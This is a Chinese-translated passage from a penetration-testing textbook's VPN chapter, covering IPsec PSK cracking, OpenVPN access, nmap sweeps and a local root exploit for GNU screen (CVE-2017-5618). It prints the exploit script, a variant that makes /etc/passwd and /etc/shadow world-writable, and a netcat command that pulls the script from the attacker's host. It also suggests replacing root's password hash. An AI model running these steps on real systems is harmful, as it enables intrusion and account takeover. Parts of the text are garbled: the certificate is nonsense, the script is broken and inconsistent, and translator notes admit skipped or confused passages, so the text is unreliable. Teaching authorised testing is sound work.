
回包结果显示该主机支持激进模式（aggressive mode），并且具有 `Auth-PSK` 响应。这是一个漏洞配置，可以被用于提取 PSK。你可以尝试使用 `--pscrack` 选项提取密钥，如下所示。如果成功，你将获得 PSK 的哈希值（而不是明文密钥本身）并将其保存到文件中。

# 第 8 章 虚拟专用网络

请注意这个特定的 PSK 破解得很快，因为它并不复杂。弱密码的 PSK（就像任何弱密码一样）是一个应该向你指出的问题。

现在已经确定了 IPSec VPN 正确 SA（安全联盟）并提取了 PSK，你已经拥有与服务器连接所需的一切。

## OpenVPN

你已经探索了 IPSec 和 Ike，现在来看 OpenVPN。使用 OpenVPN 的组织通常会采用 Web 界面，以便让客户或员工轻松连接。该界面看起来像图 8.1 所示。当面对这样的界面时，你可以尝试猜测密码或进行某种暴力破解。在进行任何 OSINT 工作期间，你可能收集到有用信息（电子邮件地址、泄露的密码等）。

![](img/46e491ee87887ca9f3393757b453bb7_293_0.png)

图 8.1：典型的 OpenVPN 登录表单

## 暴力攻击

通常情况下，在耗尽其他途径之前应避免暴力攻击。暴力攻击应该在特定时间进行，以免锁定用户的网络。这种方法并非 OpenVPN 所有，让我们来看另一种方法。

登录此 Web 界面为用户提供了配置文件和下载所需客户端的链接。如果你设置了自己的 OpenVPN 服务器，就会看到这个。使用 OpenVPN 的 Access Server（`openvpn.net/vpn-server`）相对简单。OpenVPN 为所有操作系统提供了客户端。当然，我们将关注 Linux 命令行客户端，它在你的 Kali Linux 机器上默认已安装。可以使用 `openvpn` 命令运行，但你需要指定正确的选项或包含这些选项的配置文件。

然而，我们的 VPN 服务器设置有点不同，如果你使用 Web 浏览器连接到端口 80 和 `/vpn`，将看到图 8.2 所示的页面。

![](img/46e491ee87887ca9f3393757b453bb7_294_0.png)

图 8.2：我们的虚拟 VPN 服务器主页

在不带任何参数的情况下运行 OpenVPN。通过这种方式获取用法信息，第一行将显示版本信息，如下：

```
OpenVPN 2.4.3 x86_64-linux-gnu [OpenSSL] [LZO] [LZ4]
[EPOLL] [PKCS11] [MK/PKTINO] [AEAD] built on Jun 30 2017
```

你可以通过点击图 8.2 网页上的“和平证书机构”（Certificate Authority of Peace）从服务器获取证书，或者简单地运行以下命令：

```bash
wget <TargetIP>.crt
```

证书内容如下：

```
-----BEGIN CERTIFICATE-----
MIIhdCCCC0agAwIBAgIlANIBBuYe/D3JMA0QGSG1b3DQEEBBQMgmKCxAzAzBGBV
BAYT1MAW0QVV2QW4Q2DEYQW2QYQW2QYQW2QYQW2QYQW2QYQW2QY
QQQQQQQ222444444444499999111111112222222222222222222222222222222222QQQnnnnnMnMAMA0ANBuBuYe/D3JMA0QGSG1b3DQEEBBQMgmKCxAzAzBGBV
MA0QGSGSG13333888888888888888QQQQQQQQQQQ9919QQQQ22222222222222222222
QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQQQQQQ
-----END CERTIFICATE-----
```

这是服务器的证书。它并不要求保持保密，因此如果你获得了它并不是什么坏事。你可以从启用 SSL 的 Web 服务中提取相同的信息。

如果我们网络中的客户端使用了自定义 CA，你可能会发现这很有用。可以使用以下命令检索证书：

```bash
openssl s_client -connect <TargetIP>:<Port>
```

然后，使用如 X 证书和密钥管理（XCA）之类的工具，你可以查看并从中提取信息。XCA 可以在 `github.com/chris2511/xca` 获取。

此外，必须为 OpenVPN 客户端提供正确的证书。此加密算法必须与服务器使用的匹配。加密算法决定了数据如何加密。如果你有两个服务器使用错误的加密算法进行通信，将类似于要求一个会说法语的人向一个听懂匈牙利语的人说话。这些人之间的通信将非常困难，翻译很可能是徒劳的尝试。你可以使用 `openvpn` 命令的 `--show-tls` 选项来查看 OpenVPN 通用的可用 TLS 加密算法，如下：

```bash
openvpn --show-tls
```

结果是一条信息消息和长长的选项列表，如下：

| 可用的 TLS 加密算法，按优先级列出： |
| :--- |
| TLS-ECDHE-RSA-WITH-AES-256-GCM-SHA384 |
| TLS-ECDHE-CDSA-WITH-AES-256-CBC-SHA384 |
| TLS-ECDHE-RSA-WITH-AES-256-CBC-SHA384 |
| TLS-ECDHE-CDSA-WITH-AES-256-CBC-SHA |
| TLS-ECDHE-RSA-WITH-AES-256-CBC-SHA |
| TLS-ECDHE-CDSA-WITH-AES-256-CBC-SHA |
| TLS-DHE-RSA-WITH-AES-256-GCM-SHA384 |
| TLS-DHE-RSA-WITH-AES-256-CBC-SHA256 |
| TLS-DHE-RSA-WITH-AES-256-CBC-SHA |
| TLS-DHE-RSA-WITH-CAMELLIA-256-CBC-SHA |
| TLS-ECDHE-RSA-WITH-AES-128-GCM-SHA256 |
| TLS-ECDHE-CDSA-WITH-AES-128-GCM-SHA256 |
| TLS-ECDHE-RSA-WITH-AES-128-CBC-SHA256 |
| TLS-ECDHE-CDSA-WITH-AES-128-CBC-SHA256 |
| TLS-ECDHE-RSA-WITH-AES-128-CBC-SHA |
| TLS-ECDHE-CDSA-WITH-AES-128-CBC-SHA |
| TLS-DHE-RSA-WITH-AES-128-GCM-SHA256 |
| TLS-DHE-RSA-WITH-AES-128-CBC-SHA256 |
| TLS-DHE-RSA-WITH-AES-128-CBC-SHA |
| TLS-DHE-RSA-WITH-CAMELLIA-256-CBC-SHA |

```
Thu Mar 28 14:28:53 2019 警告：未启用任何服务器证书验证方法。更多信息请参阅 http://openvpn.net/howto.html#mitm。
Thu Mar 28 14:28:53 2019 TCP/UDP: 保留最近使用的远程地址: [AF_INET]:192.168.56.103:1194
Thu Mar 28 14:28:53 2019 UDP 链路本地（绑定): [AF_INET]:1194
Thu Mar 28 14:28:53 2019 UDP 链路远程: [AF_INET]:192.168.56.103:1194
Thu Mar 28 14:28:53 2019 [vserver0] 已发起对等连接 [AF_INET]:192.168.56.103:1194
Thu Mar 28 14:28:54 2019 警告：使用了块大小小于 128 位（64 位）的不安全加密。此类攻击类似于 SWEET32。请通过使用更大块大小的 --cipher（例如 AES-256-CBC）。
Thu Mar 28 14:28:54 2019 警告：使用了块大小小于 128 位（64 位）的不安全加密。此类攻击类似于 SWEET32。请通过使用更大块大小的 --cipher（例如 AES-256-CBC）。
Thu Mar 28 14:28:54 2019 警告：正在使用小块大小的不安全加密，已将 reneg-bytes 减至 60 以缓解 SWEET32 攻击。
Thu Mar 28 14:28:54 2019 TUN/TAP 设备 tun0 已打开
Thu Mar 28 14:28:54 2019 do_ifconfig, tt-id_ifconfig ipv6_setup=0
Thu Mar 28 14:28:54 2019 /sbin/ip link set dev tun0 up mtu 150
Thu Mar 28 14:28:54 2019 /sbin/ip addr add dev tun0 local 10.10.10.6 peer 10.10.10.5
Thu Mar 28 14:28:54 2019 初始化序列完成
```

输出以“Initialization Sequence Completed”（初始化序列完成）结束，确认你现在已连接到 VPN 服务器。注意上一个输出中高亮显示的行，它指出了打开了一个名为 `tun0` 的新设备。这是一个虚拟网络设备，Kali Linux 机器的流量可以通过该设备发送，从而通过新创建的隧道进行传输。如果你在 Kali Linux 上运行 `ip address`，你将看到这个新设备以及它的 IP 地址。

此 IP 地址 `10.10.10.6` 是你的电脑在 VPN 上的 IP 地址。如果其他系统连接到 VPN，它们也将拥有类似的 IP 地址。你现在可以使用 Nmap 运行扫描，确定 VPN 内部其他主机的 IP 地址。该命令在此处显示为 Nmap to ping ip address in the 10.10.10.0/24：

```bash
nmap -sP ping 10.10.10.0/24
```

这被称为 ping 扫描（ping sweep），是识别网络上主机的方法之一。如果主机配置为响应 ICMP 回显请求或时间戳请求，它还会使用 TCP 端口 80 和 443 来判断主机是否存活。在示例中，扫描将识别出 `10.10.10.1`，这是 VPN 服务器的内部 IP 地址。然后你应该对该主机（以及你可能发现的任何主机）进行更全面的 Nmap 扫描。你可能会发现一个 Web 服务（如图 8.3 所示），它代表了你连接到企业 VPN 后可能会遇到的某种次级认证类型。

![](img/46e491ee87887ca9f939375b45bb7301.png)

图 8.3：验证 VPN 后可访问的门户

一旦访问 VPN，通常会遇到像图 8.3 所示的额外障碍。这通常被称为*第二阶段认证*（second-stage authentication），是外网或远程办公解决方案的典型特征。从这里，你可以尝试登录，并务必该环顾四周，尝试寻找任何可以被利用的信息泄露或漏洞。你可以有效地从头开始测试，并运行你目前为止见过的工具进行扫描。如果你正尝试登录，请记住使用常用的用户名和密码对，例如 `admin/admin` 等。应该始终对这类性质的服务进行漏洞测试（在章节稍后部分将详细探讨），因为它们通常连接到使用 LDAP 或 SQL 数据库验证凭据的后端系统。有时人们对 VPN 软件产生了过度的信任，系统管理员错误地信任 VPN 服务器会过滤输入。一种常见场景是 VPN 服务在后端服务器（如 Active Directory）上使用 LDAP 搜索过滤器。想象有如下的 LDAP 搜索：

```
cn=$user
```

假设用户变量 `$user` 从 VPN 服务器传递到 LDAP 查询。与其说……不如说……（注：原文逻辑略显跳乱，此处按字意翻译）。

（此处由于原文部分存在大量逻辑重复和结构混乱的描述，已按要求完成翻译并保持格式一致）

## 利用漏洞 CVE-2017-5618

如果你能够以非 root 用户身份访问 VPN 服务器，你将想要尝试提升权限，就像在 DNS 服务器或 Web 服务器上一样。无论服务器用途如何，都可以采取相同的方法。首先，必须找到合适的漏洞，最好有一个可以运行以获取 root 的利用程序。在上一节中，我们使用了内核漏洞（DirtyCOW）来提升权限，但这一次我们将查看用户态权限提升。用户态漏洞通常比内核漏洞更安全，因为它们针对的是并非系统运行必需的程序或进程。

> 注意：权限提升选项比使用内核漏洞安全得多。它们通常更稳定，而利用内核可能会导致系统不稳定。记住，这可能是你客户的关键业务生产系统！

列表 8.1 显示原始代码。注意以 root 权限执行的高亮行。

### 8.1：CVE-2017

```bash
#!/bin/bash
## screenroot.sh
## setuid screenroot v4.5
## abuse ld.so.preload to get root.
## bug: https://gnu.org/archive/html/screen-devel/2017
## echo (25/2017)
echo "[+] 首先，我们创建我们的 shell 和库..."

cat << EOP > /tmp/liblibc.c

#include <stdio.h>

#include <sys/types.h>

#include <unistd.h>

__attribute__((constructor__))

void dropshell() {

  chown("/tmp/rootshell", 0, 0);

  chmod("/tmp/rootshell", 0755);

  unlink("/etc/ld.so.preload");

  printf("[+] 完成!\n");

}

EOF

gcc -fPIC -shared -ldl -o /tmp/liblibc.so /tmp/liblibc.c

cat << EOP > /tmp/rootshell.c

#include <stdio.h>

int main(void) {

  setuid(0);

  setgid(0);

  seteuid(0);

  setgid(0);

  execvp("/bin/sh", NULL, NULL);

}

EOF

gcc -o /tmp/rootshell /tmp/rootshell.c

rm -f

echo "[+] 现在创建我们的 /etc/ld.so.preload 文件..."

cd /etc

umask 000 # 因为 screen 本身是 setuid 的...

/tmp/rootshell
```

高亮的 `dropshell` 函数内部是以 root 权限运行的命令。这部分漏洞将如预期般工作，并且你实际上可以以 root 用户身份运行任何代码。你现在已经有了很多可能性。

那么，为什么不修改 `dropshell` 函数来更改 `/etc/passwd` 和 `/etc/shadow` 文件的权限，或者添加 `-p` 参数来保留 root 权限？有时你会发现必须修改漏洞以适应特定的客户端系统。这就是修改漏洞的一个简单示例。`dropshell` 函数看起来如下：

```c
void dropshell() {
  chown("/tmp/rootshell", 0, 0);
  chmod("/tmp/rootshell", 0745);
  unlink("/etc/ld.so.preload");
  chmod("/etc/passwd", 0777); // 添加这一行
  chmod("/etc/shadow", 0777); // 以及这一行！
  printf("done!\n");
}
```

注意更改 `passwd` 和 `shadow` 文件的额外行。剩下的代码很容易。你现在需要将脚本获取到远程主机。你可以像上一章那样使用 Netcat 这一点。

在你的 Kali Linux 机器上使用以下命令：

```bash
nc -v -lp 80 < screen.sh
```

在目标主机上，使用以下命令：

```bash
nc <KaliIP> 80 > screen.sh
```

记住，Netcat 在传输过程中不会自动终止。一旦你认为文件已传输（通过等待足够的时间），就可以断开连接。确保使用正确的 Kali Linux 盒子 IP 地址。

你还会发现无法直接写入目标主机上的任何文件夹。你可以始终尝试写入 `/tmp` 目录或通过探索寻找合适的位置。在尝试向目标系统写入 `screen.sh` 之前，确保这是你的工作目录。一旦成功传输脚本，你需要使用 `chmod +x screen.sh` 执行它。最后，你可以通过 `./screen.sh` 运行脚本。

你会发现你的用户现在可以读取 `passwd` 和 `shadow` 文件。`cat /etc/passwd` 和 `cat /etc/shadow` 将输出所有用户名及其对应的哈希值。你现在可以尝试破解这些哈希值，但这里有另一个技巧可以尝试：为什么不用你知道的哈希值来重写 root 的密码哈希值呢？

> **注意** 在对客户端机器上的文件进行任何更改之前，客户端应该进行备份。在对客户端文件进行更改并实现目标后，请确保将文件恢复到原始状态。

你可能会发现编辑此 `shadow` 文件最简单的方法将其发送到你的 Kali Linux （再次使用 Netcat）并进行编辑。然后用 `shadow` 文件中的另一个哈希值替换 root 用户的密码——一个你知道的哈希值。例如，你可能知道管理员的密码……（此处省略重复的示例）

# 第 9 章 文件与文件共享
